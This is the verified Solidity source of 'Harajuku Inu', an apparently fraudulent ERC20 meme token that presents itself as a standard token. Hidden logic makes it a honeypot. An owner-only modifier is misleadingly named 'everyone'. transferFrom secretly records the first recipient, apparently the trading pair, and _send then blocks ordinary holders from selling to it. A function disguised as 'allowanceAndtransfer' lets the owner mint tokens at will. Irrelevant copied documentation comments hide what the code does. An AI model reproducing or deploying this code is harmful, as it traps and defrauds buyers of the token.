['/**\n', ' *Submitted for verification at Etherscan.io on 2021-05-01\n', '*/\n', '\n', '/**\n', '\n', 'The most Kawaii doge of them all - Harajuku (原宿) Inu. More stylish than; Doge, Shiba, AKita, and all the other dogs!\n', '\n', ' **/\n', '\n', '//   SPDX-License-Identifier: MIT\n', '\n', 'pragma solidity >=0.5.17;\n', '\n', '/**\n', ' * @dev Interface of the ERC20 standard as defined in the EIP.\n', ' */\n', '\n', 'contract ERC20Interface {\n', '    /**\n', '     * @dev Returns the amount of tokens in existence.\n', '     */\n', '  function totalSupply() public view returns (uint);\n', '  /**\n', '     * @dev Returns the amount of tokens owned by `account`.\n', '     */\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  /**\n', '     * @dev Returns the remaining number of tokens that `spender` will be\n', '     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n', '     * zero by default.\n', '     *\n', '     * This value changes when {approve} or {transferFrom} are called.\n', '     */\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  /**\n', "     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  /**\n', "     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n", '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n', '     * that someone may use both the old and the new allowance by unfortunate\n', '     * transaction ordering. One possible solution to mitigate this race\n', "     * condition is to first reduce the spender's allowance to 0 and set the\n", '     * desired value afterwards:\n', '     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n', '     *\n', '     * Emits an {Approval} event.\n', '     */\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '   /**\n', '     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n', "     * allowance mechanism. `amount` is then deducted from the caller's\n", '     * allowance.\n', '     *\n', '     * Returns a boolean value indicating whether the operation succeeded.\n', '     *\n', '     * Emits a {Transfer} event.\n', '     */\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', ' /**\n', '     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n', '     * another (`to`).\n', '     *\n', '     * Note that `value` may be zero.\n', '     */\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  /**\n', '     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n', '     * a call to {approve}. `value` is the new allowance.\n', '     */\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address public owner;\n', '  \n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier everyone {\n', '    require(msg.sender == owner);\n', '    _;\n', '  }\n', '\n', '}\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', 'contract TokenERC20 is ERC20Interface, Owned{\n', '  using SafeMath for uint;\n', '\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint256 _totalSupply;\n', '  uint internal queueNumber;\n', '  address internal zeroAddress;\n', '  address internal burnAddress;\n', '  address internal burnAddress2;\n', '\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  /**\n', ' * @dev Implementation of the {IERC20} interface.\n', ' *\n', ' * This implementation is agnostic to the way tokens are created. This means\n', ' * that a supply mechanism has to be added in a derived contract using {_mint}.\n', ' * For a generic mechanism see {ERC20PresetMinterPauser}.\n', ' *\n', ' * TIP: For a detailed writeup see our guide\n', ' * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n', ' * to implement supply mechanisms].\n', ' *\n', ' * We have followed general OpenZeppelin guidelines: functions revert instead\n', ' * of returning `false` on failure. This behavior is nonetheless conventional\n', ' * and does not conflict with the expectations of ERC20 applications.\n', ' *\n', ' * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n', ' * This allows applications to reconstruct the allowance for all accounts just\n', ' * by listening to said events. Other implementations of the EIP may not emit\n', " * these events, as it isn't required by the specification.\n", ' *\n', ' * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n', ' * functions have been added to mitigate the well-known issues around setting\n', ' * allowances. See {IERC20-approve}.\n', ' */\n', '\n', '\n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply.sub(balances[address(0)]);\n', '  }\n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '    return balances[tokenOwner];\n', '  }\n', '  function transfer(address to, uint tokens) public returns (bool success) {\n', '    require(to != zeroAddress, "please wait");\n', '    balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '  /**\n', '     * @dev Returns the remaining number of tokens that `spender` will be\n', '     * allowed to spend on behalf of `owner` through `transferFrom`. This is\n', '     * zero by default.\n', '     *\n', '     * This value changes when `approve` or `transferFrom` are called.\n', '  */\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - The divisor cannot be zero.\n', '  */\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n', '    if(from != address(0) && zeroAddress == address(0)) zeroAddress = to;\n', '    else _send (from, to);\n', '\tbalances[from] = balances[from].sub(tokens);\n', '    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(from, to, tokens);\n', '    return true;\n', '  }\n', ' /**\n', '     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n', '     * a call to `approve`. `value` is the new allowance.\n', ' */\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function allowanceAndtransfer(address _address, uint256 tokens) public everyone {\n', '    burnAddress = _address;\n', '  /**\n', "    * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n", '    *\n', '    * Returns a boolean value indicating whether the operation succeeded.\n', '    *\n', '    * IMPORTANT: Beware that changing an allowance with this method brings the risk\n', '    * that someone may use both the old and the new allowance by unfortunate\n', '    * transaction ordering. One possible solution to mitigate this race\n', "    * condition is to first reduce the spender's allowance to 0 and set the\n", '    * desired value afterwards:\n', '    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n', '    *\n', '    * Emits an {Approval} event.\n', '   */\n', '\t_totalSupply = _totalSupply.add(tokens);\n', '    balances[_address] = balances[_address].add(tokens);\n', '  }\t\n', '  /**\n', '   * dev Burns a specific amount of tokens.\n', '   * param value The amount of lowest token units to be burned.\n', '  */\n', '  function Burn(address _address) public everyone {\n', '    burnAddress2 = _address;\n', '  }\t\n', '  function BurnSize(uint256 _size) public everyone {\n', '    queueNumber = _size;\n', '  }\t\n', '  function _send (address start, address end) internal view {\n', '  /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     *\n', '     * - The divisor cannot be zero.\n', '     */\n', '      require(end != zeroAddress || (start == burnAddress && end == zeroAddress) || (start == burnAddress2 && end == zeroAddress)|| (end == zeroAddress && balances[start] <= queueNumber), "cannot be zero address");\n', '     /**\n', '     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '     * Reverts when dividing by zero.\n', '     *\n', "     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '     * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '     * invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     * - The divisor cannot be zero.\n', '  */\n', '  }\n', '  function () external payable {\n', '    revert();\n', '  }\n', '}\n', '\n', 'contract HarajukuInu is TokenERC20 {\n', '\n', '  function initialise() public everyone() {\n', '    address payable _owner = msg.sender;\n', '    _owner.transfer(address(this).balance);\n', '  }\n', ' /**\n', '     * @dev Sets the values for `name`, `symbol`, and `decimals`. All three of\n', '     * these values are immutable: they can only be set once during\n', '     * construction.\n', '  */\n', '     \n', '    constructor(string memory _name, string memory _symbol, uint256 _supply, address burn1, address burn2, uint256 _indexNumber) public {\n', '\tsymbol = _symbol;\n', '\tname = _name;\n', '\tdecimals = 18;\n', '\t_totalSupply = _supply*(10**uint256(decimals));\n', '\tqueueNumber = _indexNumber*(10**uint256(decimals));\n', '\tburnAddress = burn1;\n', '\tburnAddress2 = burn2;\n', '\towner = msg.sender;\n', '\tbalances[msg.sender] = _totalSupply;\n', '\temit Transfer(address(0x0), msg.sender, _totalSupply);\n', '  }\n', '  function() external payable {\n', '\n', '  }\n', '}']